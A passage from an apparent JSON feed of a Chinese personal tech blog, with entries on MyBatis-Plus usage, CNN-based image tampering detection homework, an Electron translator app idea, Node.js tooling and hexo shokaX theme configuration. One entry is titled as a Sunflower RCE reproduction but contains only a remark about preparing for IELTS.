class=\"keyword\">extends</span> <span class=\"title class_\">IService</span>&lt;EntityName&gt; &#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceImplName</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ServiceImpl</span>&lt;DaoName, EntityName&gt;</span><br><span class=\"line\">        <span class=\"keyword\">implements</span> <span class=\"title class_\">ServiceName</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"comment\">// and</span></span><br><span class=\"line\"><span class=\"meta\">@Mapper</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">DaoName</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseMapper</span>&lt;EntityName&gt; &#123;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当然，查询中还是要用 <code>QueryWrapper</code>  构建查询语句的：</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">QueryWrapper&lt;EntityName&gt; queryWrapper = <span class=\"keyword\">new</span> <span class=\"title class_\">QueryWrapper</span>&lt;&gt;();</span><br><span class=\"line\">queryWrapper.eq(String column, Object val);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"现在\"><a class=\"anchor\" href=\"#现在\">#</a> 现在</h2>\n<p>现在，我知道可以将二者结合使用。</p>\n<p>业务逻辑极其简单的时候（比如只需要对多个表查询数据），直接用 xml 或者注解写。</p>\n<p>需要实现增删改查的时候，继承 <code>MyBatis-Plus</code>  的通用类。</p>\n<p>如果有其他需要实现的函数，在通用类的基础上增加：</p>\n<ul>\n<li>在 <code>Service</code>  层增加对应的函数</li>\n<li>涉及到与数据库的交互时，在 <code>Dao</code>  层增加函数</li>\n</ul>\n<hr />\n<p>除此之外，还学了些零碎的东西：</p>\n<ul>\n<li>\n<p>常量、公共函数，在 <code>Common...</code>  的函数里面写好，然后在用到的时候调用</p>\n</li>\n<li>\n<p><code>utils</code>  下的函数要仔细看看，里面肯定有开发中要用到的工具包。</p>\n<p>比如：接口的返回值类型 <code>Result</code> ，文件上传工具类 <code>FileUpload</code> ，分页工具类 <code>PageUtils</code> ，获取 <code>UserId</code>  的 <code>UserInfoUtil</code> ...</p>\n<p>名字可能有所差别，但功能类似，也不用我们自己实现。</p>\n</li>\n<li>\n<p>...</p>\n</li>\n</ul>\n<p>之后，继续学习吧，希望有一天能写出干净简洁的代码。</p>\n",
            "tags": [
                "springboot",
                "Diary"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/",
            "title": "向日葵RCE复现",
            "date_published": "2023-07-22T02:36:08.000Z",
            "content_html": "<p>最近在准备雅思</p>\n",
            "tags": [
                "RCE，loophole"
            ]
        },
        {
            "id": "https://www.sycamore.top/Homework/%E5%9F%BA%E4%BA%8E%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E5%9B%BE%E5%83%8F%E7%AF%A1%E6%94%B9%E6%A3%80%E6%B5%8B/",
            "url": "https://www.sycamore.top/Homework/%E5%9F%BA%E4%BA%8E%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E5%9B%BE%E5%83%8F%E7%AF%A1%E6%94%B9%E6%A3%80%E6%B5%8B/",
            "title": "基于卷积神经网络的图像篡改检测",
            "date_published": "2023-06-19T10:13:25.000Z",
            "content_html": "<div class=\"note info\">\n<p>作业 (o′┏▽┓｀o)</p>\n</div>\n<h2 id=\"图像篡改的类型\"><a class=\"anchor\" href=\"#图像篡改的类型\">#</a> 图像篡改的类型</h2>\n<p>实践中，图像篡改至少有以下几种类型：</p>\n<ol>\n<li>\n<p>图像内容的修改（Tampering），比如通过 PS 实现换脸或者修改合同文字。其中大部分都可以归类到截取、复制、删除。</p>\n</li>\n<li>\n<p>能够间接表达第一类篡改嫌疑的操作（Manipulation）。比如为了遮掩第一类篡改痕迹而做的中值滤波、高斯模糊、高斯噪音以及再次保存图像而产生的二次 JPEG 压缩。</p>\n</li>\n</ol>\n<p>一般而言，图像篡改的最终目的是识别第一类篡改，但是难度很大，需要很深厚的司法、摄影和图像专业知识，比如在传统的图像篡改识别领域，需要使用噪声一致性、几何一致性、光照一致性等方式来进行判断。在实际操作时，需要遍历可疑区域，且每一个可疑区域都需要遍历各种方法进行检验，所以非常地费时费力。</p>\n<p>如果使用机器学习的方法，可以利用图像分割的方式直接将篡改区域分割出来，然而实际训练没有这么简单。</p>\n<p>因为如果使用算法随意地进行图像拼接。这种方式可以生成无限多的数据，但用这些粗糙的训练数据训练出的模型往往无法应对经过精细 PS 的图像，若用同样粗糙的数据做检测，即便获得了好的结果也不能验证模型的有效性。而假如我们一张一张人工 PS，效率太低，完全无法满足训练模型的需要，因此我们的工作主要在识别第二类篡改。</p>\n<p>实验中，我们首先需要通过原始图片生成经过第二类篡改的图片，再生成这些数据对应的标签（已篡改 / 未篡改），然后投入卷积神经网络进行有监督的学习，并在每一轮 epoch 后对当前模型做检测，输出测试的精准度。</p>\n<h2 id=\"卷积神经网络cnn\"><a class=\"anchor\" href=\"#卷积神经网络cnn\">#</a> 卷积神经网络（CNN）</h2>\n<h3 id=\"为什么使用卷积神经网络\"><a class=\"anchor\" href=\"#为什么使用卷积神经网络\">#</a> 为什么使用卷积神经网络</h3>\n<ol>\n<li>\n<p>CNN 和深度神经网络（DNN）</p>\n<p>这里的 DNN 指的是直接用全连接的深度神经网络。</p>\n<p>对于图像而言，如果直接采用全连接的方法，巨大的参数量会造成很多问题，比如巨大的资源消耗、过拟合、局部最优，</p>\n<p>因为图片基本是 1000×1000 像素，再加上 RGB 颜色信息的 3 个参数，就会出现三百万的参数量，这是全连接神经网络绝对无法处理的，所以需要用 CNN 减少参数量级。</p>\n<p>CNN 用卷积层提取图像中的局部特征，用池化层大幅降低参数量级（降维）</p>\n<p>卷积层：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686727431/Typera/2023/06/4d21c7e3db7073a15d12d724f59dc984.gif\" alt=\"卷积层\" /></p>\n<p>用卷积核来过滤图像的各个小区域，从而得到这些小区域的特征值</p>\n<p>池化层：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687175841/Typera/2023/06/7e967b5220d5377df9e2c47844537eab.gif\" alt=\"image2\" /></p>\n<p>即使做完了卷积，图像仍然很大（因为卷积核比较小），所以为了降低数据维度，就进行下采样，</p>\n<p>如上图，20×20 的原始图片，采样窗口为 10×10，最终池化结果为一张 2×2 的特征图</p>\n</li>\n<li>\n<p>CNN 和基于特征提取的传统篡改检测</p>\n<p>传统篡改检测方法基于图像统计信息和物理特征检测图像篡改操作，主要针对对复制黏贴和拼接组合两种篡改手段，</p>\n<p>特征提取的方法多种多样，不再赘述，其计算过程大多过于繁琐，运用的函数复杂性远高于 CNN。</p>\n<p>而且对于大数据量的处理，CNN 更有优势：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686731027/Typera/2023/06/fe4c339cd26fdaa558292c2a0bbe298b.png\" alt=\"CNN\" /></p>\n<h2 id=\"对第二类图像篡改的检测\"><a class=\"anchor\" href=\"#对第二类图像篡改的检测\">#</a> 对第二类图像篡改的检测</h2>\n<h3 id=\"实验数据\"><a class=\"anchor\" href=\"#实验数据\">#</a> 实验数据</h3>\n<p>使用的原始数据集括训练集的 40 张图片和测试集的 20 张图片，均来自以往使用手机拍摄得到（无美颜）。</p>\n<p>首先，我们制作训练数据，用 python 的 cv2 库和 numpy 库实现高斯模糊、高斯噪声、中值模糊、二次 JPEG 压缩、亮度对比度修改等操作，然后篡改原始图片，保存原始图片和篡改后的图片，并保留各自的标签（1/0）。</p>\n<p>训练使用的图像块大小为 28×28，所以训练集截取了约 20 万个图像块，测试集截取了约 10 万个图像块。</p>\n<p>然后定义模型，完成训练后测试数据的准确率。</p>\n<p>我们总共选取了 60 张由手机拍摄的照片，其中 40 张作为训练集，20 张作为测试集。照片的选取需要遵从一定的标准，首先务必保证照片拍摄时没有开启美颜等模式，这会导致模型的训练和测试出现偏差（因为美颜本身也可以视作一种图片篡改）；其次拍摄模糊、歪斜的照片也需要出现在数据集中，这是为了保证数据集的多样性，让我们训练出来的模型面对多样的图片的时候能保持更高的准确性。</p>\n<p>然后我们需要对原始图片进行篡改，生成篡改后的数据集。我们一共实现了高斯模糊、高斯噪声、中值模糊、二次 JPEG 压缩、亮度 / 对比度修改 5 种篡改方法。其中，我们特意加入了亮度 / 对比度修改这种篡改方法，我们认为卷积神经网络在应对这种篡改方面无能为力，但需要经过实验验证。高斯模糊、中值模糊分别通过 cv2 库的 GaussianBlur () 和 medianBlur () 函数实现，其余篡改方法均通过自编写的函数实现。</p>\n<p>最后将篡改后的数据集和原始数据集进行乱序的合并，同时对应的标签（已篡改 / 未篡改）也要一一对应地合并。</p>\n<p>超参数如下：</p>\n<ul>\n<li>网络结构：6 层卷积，简单的 VGG 风格，每 2 层一个 pooling</li>\n<li>优化器：Adam</li>\n<li>epoch 数量：10</li>\n<li>学习率：前 5 个 epoch 学习率 1e-4，后 5 个是 1e-5</li>\n<li>batch_size：一次抓取 50 个样本训练</li>\n</ul>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687175862/Typera/2023/06/7040e9af89e49b6fddf3e0620c2f7916.png\" alt=\"image44\" /></p>\n<h3 id=\"实验结果\"><a class=\"anchor\" href=\"#实验结果\">#</a> 实验结果</h3>\n<p>高斯模糊、高斯噪声、中值模糊、二次 JPEG 压缩的检测结果都很不错，经过 10 轮 epoch 后，最终的精准度均稳定在 90% 以上。其中高斯噪声达到了 99%，我们认为应该是篡改图本身与原图对比明显的原因，通过对大量篡改图的学习，模型能很轻易地抽象出篡改的特征，从而进行更加精准的判断。</p>\n<p>亮度 / 对比度的精准度只有 50% 左右，这个结果表明，卷积神经网络对图像进行亮度 / 对比度的篡改检测无能为力。我们猜测这也许是因为这种篡改后的图片与原始图片没有本质上的区别，卷积神经网络抽象出的特征是类似于原图的，但这种想法的正确性还有待验证。</p>\n<p>高斯模糊：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686734917/Typera/2023/06/65359b472aa28e64f839e965bce97108.png\" alt=\"2\" /></p>\n<p>高斯噪声：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686742374/Typera/2023/06/e9e97cf8a1bd777db7afc55d9db4b480.png\" alt=\"image-20230614193251237\" /></p>\n<p>中值模糊：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687179264/Typera/2023/06/48ff4fc5e8acecfe8d9a492ca6d8ea11.png\" alt=\"image-20230614205309782\" /></p>\n<p>二次 JPEG 压缩：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686752710/Typera/2023/06/72c6c4569175987c83df64a5f748b19d.png\" alt=\"image-20230614222506299\" /></p>\n<p>亮度修改：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686759533/Typera/2023/06/42b9386be2989de4375eb726319b3c13.png\" alt=\"image-20230615001847275\" /></p>\n<p>对比度修改：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687179256/Typera/2023/06/5a4fa62d82228b6bc12025547582efe4.png\" alt=\"image-20230615083039860\" /></p>\n</li>\n</ol>\n",
            "tags": [
                "Python",
                "计算机视觉",
                "深度学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Develop/Electron/Google-Translate-Desktop/",
            "url": "https://www.sycamore.top/Develop/Electron/Google-Translate-Desktop/",
            "title": "Google-Translate-Desktop",
            "date_published": "2023-05-02T06:46:42.000Z",
            "content_html": "<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vbmVTeWNhbW9yZS9Hb29nbGUtVHJhbnNsYXRlLURlc2t0b3A=\">Google-Translate-Desktop</span> (private repo)</p>\n<p>腰斩了，因为我发现已经有很好用的了，推荐：[Pot](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3QtYXBwLmNvbS8=\">Pot | 跨平台划词翻译和 OCR</span>)</p>\n<p>因此以下内容仅作一个 idea 记录。</p>\n<hr />\n<h1 id=\"准备工作\"><a class=\"anchor\" href=\"#准备工作\">#</a> 准备工作</h1>\n<h2 id=\"选择环境\"><a class=\"anchor\" href=\"#选择环境\">#</a> 选择环境</h2>\n<p><span class=\"label info\">node v16.20.0</span> / <span class=\"label info\">electron v20.3.12</span></p>\n<h2 id=\"基本方案\"><a class=\"anchor\" href=\"#基本方案\">#</a> 基本方案</h2>\n<p>利用  <code>npm</code>  插件: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnBtanMuY29tL3BhY2thZ2UvZ29vZ2xlLXRyYW5zbGF0ZS1hcGk=\">google-translate-api</span></p>\n<p>该插件提供了一个 API 接口：translate (text, options)，能实现谷歌翻译的基本功能</p>\n<p>用 electron 搭建程序的主要页面，用该插件实现简单的翻译</p>\n<h2 id=\"具体功能\"><a class=\"anchor\" href=\"#具体功能\">#</a> 具体功能</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\">  自动检测语言并能选择翻译的目标语言</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" disabled=\"true\" /><label for=\"cbx_1\">  详细释义？</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_2\" disabled=\"true\" /><label for=\"cbx_2\">  划词翻译</label>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_3\" disabled=\"true\" /><label for=\"cbx_3\">  替换、复制翻译结果</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_4\" disabled=\"true\" /><label for=\"cbx_4\">  快捷键呼出</label></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"开发实现\"><a class=\"anchor\" href=\"#开发实现\">#</a> 开发实现</h1>\n<h2 id=\"搭建环境\"><a class=\"anchor\" href=\"#搭建环境\">#</a> 搭建环境</h2>\n<p><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm install 16 lts  # 安装v15的新环境</span><br><span class=\"line\">nvm use 16.20.0</span><br><span class=\"line\"></span><br><span class=\"line\">npm init  # 初始化npm库</span><br><span class=\"line\">npm install electron@20.3.12 --save-dev  # 安装electron</span><br><span class=\"line\">npm install electron-builder  # 打包插件</span><br><span class=\"line\">npm install electron-store  # 数据存储插件</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"基本页面\"><a class=\"anchor\" href=\"#基本页面\">#</a> 基本页面</h2>\n<p>通过 <span class=\"label info\">electron</span> 实现。</p>\n<p>细化主页面构成：</p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\">\n<p><input type=\"checkbox\" id=\"cbx_5\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_5\">   +++<strong> 顶部标题栏</strong><br />\n传统地去掉难看的原配 Windows 标题栏</label></p>\n<ul>\n<li>图标</li>\n<li>软件名称</li>\n<li>最小化 / 最大化 / 关闭<br />\n +++</li>\n</ul>\n</li>\n<li class=\"task-list-item\">\n<p><input type=\"checkbox\" id=\"cbx_6\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_6\">  +++ <strong>菜单栏</strong><br />\n功能切换</label></p>\n<ul>\n<li>翻译文本</li>\n<li>翻译文件？</li>\n<li>翻译网页？</li>\n</ul>\n<p>设置</p>\n<ul>\n<li>快捷键<br />\n +++</li>\n</ul>\n</li>\n<li class=\"task-list-item\">\n<p><input type=\"checkbox\" id=\"cbx_7\" disabled=\"true\" /><label for=\"cbx_7\">  +++<strong> 具体功能实现页面</strong><br />\n翻译功能栏</label></p>\n<ul>\n<li>选择源语言 / 目标语言</li>\n<li>左右切换</li>\n</ul>\n<p>翻译内容 / 翻译结果<br />\n +++</p>\n</li>\n</ul>\n<h2 id=\"翻译功能\"><a class=\"anchor\" href=\"#翻译功能\">#</a> 翻译功能</h2>\n<p>调用 Google 的 API...</p>\n",
            "tags": [
                "Develop",
                "Electron",
                "Google Translate",
                "node"
            ]
        },
        {
            "id": "https://www.sycamore.top/Develop/Electron/nodeJS%E7%9B%B8%E5%85%B3/",
            "url": "https://www.sycamore.top/Develop/Electron/nodeJS%E7%9B%B8%E5%85%B3/",
            "title": "nodeJS相关",
            "date_published": "2023-04-30T09:42:04.000Z",
            "content_html": "<h2 id=\"node版本控制\"><a class=\"anchor\" href=\"#node版本控制\">#</a> node 版本控制</h2>\n<p>大部分时候，并不是版本越新越好，开发过程中经常会遇到某些好用的插件只支持较低版本的 <code>Nodejs</code> ，这时候就需要用到版本控制。</p>\n<p>使用<span class=\"label success\"> nvm</span>，可以轻松管理版本。实用命令如下：</p>\n<p><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nvm install [版本号] [lts]  # 安装特定版本的node</span><br><span class=\"line\">nvm use [版本号]  # 切换特定版本的node</span><br><span class=\"line\">nvm list  # 列出已安装的node版本，星号标注当前使用的版本</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"项目仓库\"><a class=\"anchor\" href=\"#项目仓库\">#</a> 项目仓库</h2>\n<p><code>package.json</code>  是非常重要的文件，其中记录了项目的配置信息。</p>\n<p>最好加一个 <code>.gitignore</code>  文件，其中记录 <code>git</code>  上传时忽略更改的目录和文件，基本上需要包含 <code>*.log</code>  以及 <code>node_modules/</code> ，其中前者是可能存在的日志文件，后者是项目本地安装的插件</p>\n<p>这也体现了 <code>package.json</code>  文件的重要性，因为通常插件安装目录是不会上传的，所以每次 <code>clone</code>   <code>GitHub</code>  项目的时候，都是没有安装插件的状态，在执行任何更改之前都要执行命令： <code>npm install --force</code></p>\n<p>而 <code>package.json</code>  文件中有部分就记录了项目中应该安装的插件，上述命令也正是根据该文件中的这一部分来安装插件的。</p>\n<h2 id=\"git大文件管理\"><a class=\"anchor\" href=\"#git大文件管理\">#</a> git 大文件管理</h2>\n<p>也许有时你的项目中出现了大文件，即大于 100MB 的文件，这时候用 <code>git</code>  是上传不上去的，这就需要用到  <code>Git LFS</code></p>\n<p><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git lfs install  # 安装Git LFS</span><br><span class=\"line\">git lfs track &quot;...&quot;  # 要追踪的大文件名，可为 *.exe 的格式</span><br><span class=\"line\">git add .gitattributes  # 配置文件</span><br></pre></td></tr></table></figure></p>\n<p>然后就是 <code>add/commit/push</code>  的常规操作了</p>\n<h2 id=\"npm-插件编写\"><a class=\"anchor\" href=\"#npm-插件编写\">#</a> npm 插件编写</h2>\n",
            "tags": [
                "Develop",
                "node",
                "npm",
                "plugs"
            ]
        },
        {
            "id": "https://www.sycamore.top/Develop/Electron/Sentences-Desktop%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/",
            "url": "https://www.sycamore.top/Develop/Electron/Sentences-Desktop%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/",
            "title": "Sentences-Desktop桌面程序开发",
            "date_published": "2023-04-30T09:35:33.000Z",
            "content_html": "<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vbmVTeWNhbW9yZS9TZW50ZW5jZXMtRGVza3RvcA==\">Sentences-Desktop</span></p>\n<p>算是一个已完成的个人项目，虽然依旧不是很满意，而且我本人也没有在使用，</p>\n<p>但效果看起来还是很不错的，使用了 Hitokoto，具体在上述链接中，有空会更新以下开发中遇到的事情。</p>\n<hr />\n",
            "tags": [
                "Develop",
                "Electron",
                "node",
                "Hitokoto"
            ]
        },
        {
            "id": "https://www.sycamore.top/Develop/shokaX/hexo-shokaX%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/",
            "url": "https://www.sycamore.top/Develop/shokaX/hexo-shokaX%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/",
            "title": "hexo-shokaX主题修改",
            "date_published": "2023-04-30T06:05:53.000Z",
            "content_html": "<p><span class=\"label\">shokaX</span> 主题基于<span class=\"label\"> shoka</span> 主题进行二次开发，据说是因为原主题停止更新...</p>\n<p>因为各种原因吧，若按照 <code>shokaX</code>  作者写的文档更改配置的话，还需要一定程度上参考一下 <code>shoka</code>  主题的配置文档，</p>\n<p>所以，我决定记录一下这次博客迁移中对 <code>shokaX</code>  主题进行的更改。</p>\n<h1 id=\"主题安装\"><a class=\"anchor\" href=\"#主题安装\">#</a> 主题安装</h1>\n<p><code>shokaX</code>  主题配置文档中，使用主题作者自己搭的工具 <code>SXC</code>  进行安装，</p>\n<div class=\"note info\">\n<p>注意：因为自定义内容较多，所以选择从 <code>github</code>  安装。</p>\n</div>\n<p><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">hexo init</span></span><br><span class=\"line\">npm install shokax-cli --location=global</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cd</span> your_blog</span></span><br><span class=\"line\">SXC install -r=github shokaX</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"主题修改\"><a class=\"anchor\" href=\"#主题修改\">#</a> 主题修改</h1>\n<h2 id=\"值得一说的基础配置\"><a class=\"anchor\" href=\"#值得一说的基础配置\">#</a> 值得一说的基础配置</h2>\n<h3 id=\"顶栏\"><a class=\"anchor\" href=\"#顶栏\">#</a> 顶栏</h3>\n<p>如果想和 <code>shoka</code>  主题站点的顶栏配置一样的，可以参考我的配置：</p>\n<p><span class=\"spoiler\" title=\"你知道得太多了\">shokaX 配置文档中说得也够详细了，但某些话读起来总有点谜语人的感觉，比如超链接的部分，文档的说法实在是令人迷惑...</span></p>\n<p><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\">  <span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">home</span></span><br><span class=\"line\">  <span class=\"attr\">about:</span></span><br><span class=\"line\">    <span class=\"attr\">default:</span> <span class=\"string\">/about/</span> <span class=\"string\">||</span> <span class=\"string\">user</span></span><br><span class=\"line\">    <span class=\"attr\">aboutsite:</span> <span class=\"string\">/about/</span> <span class=\"string\">||</span> <span class=\"string\">cloud</span></span><br><span class=\"line\">  <span class=\"attr\">posts:</span></span><br><span class=\"line\">    <span class=\"attr\">default:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">feather</span></span><br><span class=\"line\">    <span class=\"attr\">archives:</span> <span class=\"string\">/archives/</span> <span class=\"string\">||</span> <span class=\"string\">list-alt</span></span><br><span class=\"line\">    <span class=\"attr\">categories:</span> <span class=\"string\">/categories/</span> <span class=\"string\">||</span> <span class=\"string\">th</span></span><br><span class=\"line\">    <span class=\"attr\">tags:</span> <span class=\"string\">/tags/</span> <span class=\"string\">||</span> <span class=\"string\">tags</span></span><br><span class=\"line\">  <span class=\"attr\">friends:</span> <span class=\"string\">/friends/</span> <span class=\"string\">||</span> <span class=\"string\">heart</span></span><br><span class=\"line\">  <span class=\"attr\">travellings:</span> <span class=\"string\">https://www.travellings.cn/go.html</span>  <span class=\"string\">||</span> <span class=\"string\">subway</span></span><br></pre></td></tr></table></figure></p>\n<div class=\"note default\">\n<p>关于自定义 icon 的添加， <code>shoka</code>  的配置文档中有提供一种解决方法，但建议参考我后面的解决方案 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zeWNhbW9yZS50b3AvJUU1JThEJTlBJUU1JUFFJUEyJUU0JUI4JUJCJUU5JUEyJTk4L2hleG8tc2hva2FYJUU0JUI4JUJCJUU5JUEyJTk4JUU0JUJGJUFFJUU2JTk0JUI5LyNpY29uZm9udCVFNSU5QiVCRSVFNiVBMCU4NyVFNSVCQSU5MyVFNiVCNyVCQiVFNSU4QSVBMA==\">[这里]</span></p>\n</div>\n<h3 id=\"评论系统\"><a class=\"anchor\" href=\"#评论系统\">#</a> 评论系统</h3>\n<p>因为 <code>minivaline</code>  停止维护且 <code>valine</code>  评论系统存在严重的安全问题， <code>shokaX</code>  推荐使用 <code>valine</code>  系其他评论系统代替。</p>\n<p>这里提供我的 <code>waline</code>  的配置方案（只放了与 <code>shokaX</code>  配置文档中不一样的部分）：</p>\n<p><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">waline:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">serverURL:</span> <span class=\"string\">&quot;https://vercel.sycamore.top&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">locale:</span> &#123;</span><br><span class=\"line\">      <span class=\"attr\">placeholder:</span> <span class=\"string\">&quot;1. 提问前请先仔细阅读本文档⚡\\n2. 页面显示问题💥，请提供控制台截图📸或者您的测试网址\\n3. 其他任何报错💣，请提供详细描述和截图📸，祝食用愉快💪&quot;</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure></p>\n<div class=\"note default\">\n<p>其中， <code>serverURL</code>  按照 <code>waline</code>  官方文档绑定了域名， <code>local.placeholder</code>  为评论框中默认显示的文字</p>\n</div>\n<p>placeholder 与 valine 系统配置不同，我是在 waline 官方文档 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxpbmUuanMub3JnL21pZ3JhdGlvbi92YWxpbmUuaHRtbA==\">从 Valine 迁移</span> 中找到的</p>\n<h3 id=\"搜索系统\"><a class=\"anchor\" href=\"#搜索系统\">#</a> 搜索系统</h3>\n<p><code>algolia</code>  必须参考官方文档进行配置，需要<strong>注意</strong>的是：</p>\n<ol>\n<li><code>algolia</code>  的配置应该是在 <code>_config.yml</code>  文件中的，我也不知道为啥要在 <code>config</code>  里：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682840599/Typera/2023/04/c825437e5c42bd869ff137173c375d20.png\" alt=\"image-20230430151055652\" /><br />\n 也许是一定得这样？</li>\n<li>记得要运行 <code>hexo algolia</code>  将数据更新到 index 中</li>\n</ol>\n<h3 id=\"默认图片更改\"><a class=\"anchor\" href=\"#默认图片更改\">#</a> 默认图片更改</h3>\n<p>博客根目录下创建 <code>source/_data/assets</code>  文件夹，要改哪张图，直接将你的图片名称更改为对应的即可。原图片在主题目录的 <code>source/assets</code>  文件夹下。</p>\n<p>比如你要替换 <code>favicon.ico</code>  文件（站点图标），就把你的图标文件重命名为 <code>favicon.ico</code> ，然后放到 <code>source/_data/assets</code>  文件夹下。</p>\n<hr />\n<div class=\"note info\">\n<p>基础的部分不再赘述，配置可参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmthaXRha3UueHl6Lw==\"> shokaX</span> 和<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaG9rYS5sb3N0eXUubWUvY29tcHV0ZXItc2NpZW5jZS9ub3RlL3RoZW1lLXNob2thLWRvYy8=\"> shoka</span> 主题的配置文档。</p>\n</div>\n<h2 id=\"主题文件的修改和配置\"><a class=\"anchor\" href=\"#主题文件的修改和配置\">#</a> 主题文件的修改和配置</h2>\n<h3 id=\"音乐播放器\"><a class=\"anchor\" href=\"#音乐播放器\">#</a> 音乐播放器</h3>\n<p>配置格式参考 <code>shoka</code>  的配置文档，记得改的链接必须是有效的、公开的歌单，</p>\n<p>有效指的是：歌单中至少有一首歌不是 VIP 专享、能播放。否则会加载默认歌单。</p>\n<p>此外，如果你的播放器根本加载不出来，请检查主题目录下的 <code>source/js/_app/player.js</code>  和 <code>player.ts</code> ，</p>\n<p>全局搜索 <code>meting</code>  应该就能看到（因为是基于 <span class=\"exturl\" 